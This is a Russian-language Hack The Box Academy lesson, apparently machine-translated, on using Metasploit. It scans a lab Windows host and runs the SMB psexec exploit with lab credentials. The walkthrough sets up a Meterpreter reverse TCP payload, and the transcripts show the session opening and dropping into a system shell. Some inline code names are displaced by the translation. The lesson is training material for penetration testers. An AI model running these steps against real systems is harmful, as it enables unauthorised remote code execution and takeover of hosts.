
[Metasploit](https://www.metasploit.com/) — это автоматизированная платформа для атак, разработанная для `Rapid7`упрощения процесса эксплуатации уязвимостей с помощью готовых модулей, содержащих простые в использовании опции для эксплуатации уязвимостей и доставки полезных нагрузок для получения доступа к командной оболочке уязвимой системы. Эксплуатация уязвимой системы может быть настолько простой, что некоторые поставщики услуг по обучению кибербезопасности ограничивают количество её использования на лабораторных экзаменах. В Hack The Box мы поощряем экспериментирование с инструментами в наших лабораторных средах до тех пор, пока у вас не сформируется прочное базовое понимание. Большинство организаций не будут ограничивать нас в выборе инструментов, которые мы можем или не можем использовать в рамках проекта. Однако они ожидают, что мы будем знать, что делаем. Поэтому наша обязанность — стремиться к пониманию по мере обучения. Непонимание последствий использования инструментов может быть разрушительным при реальном тестировании на проникновение или аудите. Это одна из основных причин, по которой мы должны постоянно стремиться к более глубокому пониманию инструментов, методов, методологий и практик, которые мы изучаем.

В этом разделе мы будем взаимодействовать с `community edition`Metasploit на Pwnbox. Мы будем использовать готовые `modules`и созданные полезные нагрузки `MSFVenom`. Важно отметить, что многие известные компании в сфере кибербезопасности используют платную версию Metasploit `Metasploit Pro`для проведения тестов на проникновение, аудитов безопасности и даже кампаний социальной инженерии. Если вы хотите изучить различия между Community Edition и Metasploit Pro, вы можете ознакомиться с этой [сравнительной таблицей](https://www.rapid7.com/products/metasploit/download/editions/) .

---

## Практика с Metasploit

Остаток этого модуля мы могли бы посвятить описанию всего, что касается Metasploit, но мы ограничимся рассмотрением лишь самых основ в контексте командных оболочек и полезных нагрузок.

Начнём практическую работу с Metasploit, запустив консоль Metasploit Framework от имени root ( `sudo msfconsole`).

#### Запуск MSF

        shellsession
``MuraMitchi@htb[/htb]$ sudo msfconsole                                                     IIIIII    dTb.dTb        _.---._   II     4'  v  'B   .'"".'/|\`.""'.  II     6.     .P  :  .' / | \ `.  :  II     'T;. .;P'  '.'  /  |  \  `.'  II      'T; ;P'    `. /   |   \ .' IIIIII     'YvP'       `-.__|__.-' I love shells --egypt        =[ metasploit v6.0.44-dev                          ] + -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ] + -- --=[ 592 payloads - 45 encoders - 10 nops            ] + -- --=[ 8 evasion                                       ] Metasploit tip: Writing a custom module? After editing your  module, why not try the reload command msf6 >``

Мы видим, что в качестве баннера при запуске используется креативная ASCII-графика, а также некоторые цифры, представляющие особый интерес.

- `2131`эксплойты
- `592`полезная нагрузка

Эти цифры могут меняться по мере того, как разработчики добавляют и удаляют код, или если вы импортируете модуль для использования в Metasploit. Давайте познакомимся с полезными нагрузками Metasploit на примере классического примера `exploit module`, который можно использовать для взлома системы Windows. Помните, что Metasploit можно использовать не только для эксплуатации уязвимостей. Мы также можем использовать различные модули для сканирования и перечисления целей.

В данном случае мы будем использовать результаты перечисления, полученные в ходе `nmap`сканирования, чтобы выбрать модуль Metasploit для использования.

#### Сканирование NMAP

        shellsession
`MuraMitchi@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC Nmap scan report for 10.129.164.25 Host is up (0.020s latency). Not shown: 996 closed ports PORT     STATE SERVICE       VERSION 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) Host script results: |_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware) | smb-security-mode:  |   account_used: guest |   authentication_level: user |   challenge_response: supported |_  message_signing: disabled (dangerous, but default) | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required | smb2-time:  |   date: 2021-09-09T21:03:31 |_  start_date: N/A`

В выходных данных мы видим несколько стандартных портов, которые обычно открыты в системе Windows по умолчанию. Помните, что сканирование и перечисление — отличный способ узнать, какая ОС (Windows или Linux) установлена ​​на целевом сервере, чтобы найти подходящий модуль для запуска с Metasploit. Давайте выберем `SMB`(прослушивание на `445`) в качестве потенциального вектора атаки.

Получив эту информацию, мы можем использовать функцию поиска Metasploit для обнаружения модулей, связанных с уязвимостью SMB. В командной строке `msfconsole`мы можем выполнить команду `search smb`, чтобы получить список модулей, связанных с уязвимостями SMB:

#### Поиск внутри Metasploit

        shellsession
`msf6 > search smb Matching Modules ================ #    Name                                                          Disclosure Date    Rank   Check  Description   -       ----                                                     ---------------    ----   -----  ---------- 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution`

Мы увидим длинный список, `Matching Modules`связанный с нашим поиском. Обратите внимание на формат каждого модуля. Каждый модуль имеет номер, указанный в крайнем левом углу таблицы, чтобы упростить выбор модуля: , `Name`, `Disclosure Date`, и .`Rank``Check``Description`

Число слева от каждого потенциального модуля — это относительное число, зависящее от вашего поиска, которое может меняться по мере добавления модулей в Metasploit. Не ожидайте, что это число будет совпадать каждый раз, когда вы выполняете поиск или пытаетесь использовать модуль.

Рассмотрим один конкретный модуль, чтобы понять его роль в контексте полезных нагрузок.

`56 exploit/windows/smb/psexec`

|Выход|Значение|
|---|---|
|`56`|Номер, присвоенный модулю в таблице в контексте поиска. Этот номер упрощает выбор. `use 56`Для выбора модуля можно использовать команду.|
|`exploit/`|Это определяет тип модуля. В данном случае это модуль эксплойта. Многие модули эксплойтов в MSF включают в себя полезную нагрузку, которая пытается установить сеанс командной оболочки.|
|`windows/`|Это определяет целевую платформу. В данном случае мы знаем, что целью является Windows, поэтому эксплойт и полезная нагрузка будут предназначены для Windows.|
|`smb/`|Это определяет службу, для которой записывается полезная нагрузка в модуле.|
|`psexec`|Это определяет инструмент, который будет загружен в целевую систему, если она окажется уязвимой.|

После выбора модуля мы заметим изменение в подсказке, которое позволит нам настроить модуль в соответствии с параметрами, специфичными для нашей среды.

#### Выбор варианта

        shellsession
`msf6 > use 56 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/psexec) >`

Обратите внимание, что `exploit`находится за скобками. Это можно интерпретировать как то, что тип модуля MSF является эксплойтом, а конкретный эксплойт и полезная нагрузка написаны для Windows. Вектор атаки — `SMB`, а полезная нагрузка Meterpreter будет доставлена ​​с помощью [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) . Давайте узнаем больше об использовании этого эксплойта и доставке полезной нагрузки с помощью `options`команды.

#### Анализ вариантов использования эксплойта

        shellsession
`msf6 exploit(windows/smb/psexec) > options Module options (exploit/windows/smb/psexec):    Name                  Current Setting  Required  Description   ----                  ---------------  --------  -----------   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'   RPORT                 445              yes       The SMB service port (TCP)   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing   SERVICE_DISPLAY_NAME                   no        The service display name   SERVICE_NAME                           no        The service name   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo                                                    lder share   SMBDomain             .                no        The Windows domain to use for authentication   SMBPass                                no        The password for the specified username   SMBUser                                no        The username to authenticate as Payload options (windows/meterpreter/reverse_tcp):    Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen port Exploit target:    Id  Name   --  ----   0   Automatic`

Это одна из областей, где Metasploit проявляет себя с лучшей стороны с точки зрения простоты использования. В выводе параметров модуля мы видим различные параметры и настройки с описанием значения каждой из них. В этом разделе мы не будем использовать `SERVICE_DESCRIPTION`и . Обратите внимание, как этот конкретный эксплойт будет использовать обратное TCP-соединение с помощью . Оболочка Meterpreter предоставляет нам гораздо больше возможностей, чем обычная обратная TCP-оболочка, как мы установили в предыдущих разделах этого модуля. Это полезная нагрузка по умолчанию, используемая в Metasploit.`SERVICE_DISPLAY_NAME``SERVICE_NAME``Meterpreter`

Нам потребуется использовать эту `set`команду для настройки следующих параметров следующим образом:

#### Настройки параметров

        shellsession
`msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71 RHOSTS => 10.129.180.71 msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$ SHARE => ADMIN$ msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt! SMBPass => HTB_@cademy_stdnt! msf6 exploit(windows/smb/psexec) > set SMBUser htb-student SMBUser => htb-student msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222 LHOST => 10.10.14.222`

Эти настройки обеспечат доставку нашей полезной нагрузки в нужный целевой объект ( `RHOSTS`), ее загрузку в административную папку по умолчанию ( `ADMIN$`) с использованием учетных данных ( `SMBPass`& `SMBUser`), а затем установление обратного соединения с нашей локальной хост-машиной ( `LHOST`).

Эти настройки будут специфичны для IP-адреса вашего атакующего и целевого устройств, а также для учетных данных, которые вы можете получить во время атаки. Мы можем установить IP-адрес VPN-туннеля LHOST (локального хоста) или идентификатор интерфейса VPN-туннеля.

#### Эксплойты прочь

        shellsession
`msf6 exploit(windows/smb/psexec) > exploit [*] Started reverse TCP handler on 10.10.14.222:4444  [*] 10.129.180.71:445 - Connecting to the server... [*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'... [*] 10.129.180.71:445 - Selecting PowerShell target [*] 10.129.180.71:445 - Executing the payload... [+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.129.180.71 [*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000 meterpreter >`

После отправки `exploit`команды запускается эксплойт, и предпринимается попытка доставить полезную нагрузку на целевой объект с использованием полезной нагрузки Meterpreter. Metasploit сообщает о каждом шаге этого процесса, как видно в выводе. Мы знаем, что это было успешно, потому что `stage`был успешно отправлен запрос, который установил сессию оболочки Meterpreter ( `meterpreter >`) и сессию оболочки системного уровня. Следует помнить, что Meterpreter — это полезная нагрузка, которая использует внедрение DLL-библиотек в память для скрытого установления канала связи между атакующим устройством и целевым объектом. Правильные учетные данные и вектор атаки могут дать нам возможность загружать и скачивать файлы, выполнять системные команды, запускать кейлоггер, создавать/запускать/останавливать службы, управлять процессами и многое другое.

В данном случае, как подробно описано в [документации к модулю Rapid 7](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) : «Этот модуль использует действительное имя пользователя и пароль администратора (или хеш пароля) для выполнения произвольной полезной нагрузки. Этот модуль аналогичен утилите "psexec", предоставляемой SysInternals. Теперь этот модуль может самостоятельно удалять лишние данные. Служба, созданная этим инструментом, использует случайно выбранное имя и описание».

Как и другие интерпретаторы командных языков (Bash, PowerShell, ksh и т. д.), сеансы оболочки Meterpreter позволяют нам вводить набор команд, которые мы можем использовать для взаимодействия с целевой системой. Мы можем использовать команду `?`для просмотра списка доступных команд. Мы заметим ограничения оболочки Meterpreter, поэтому рекомендуется попробовать использовать `shell`команду для перехода в системную оболочку, если нам нужно работать со всем набором системных команд, присущих нашей целевой системе.

#### Интерактивная оболочка

        shellsession
`meterpreter > shell Process 604 created. Channel 1 created. Microsoft Windows [Version 10.0.18362.1256] (c) 2019 Microsoft Corporation. All rights reserved. C:\WINDOWS\system32>`

`Now let's put our knowledge to the test with some challenge questions`.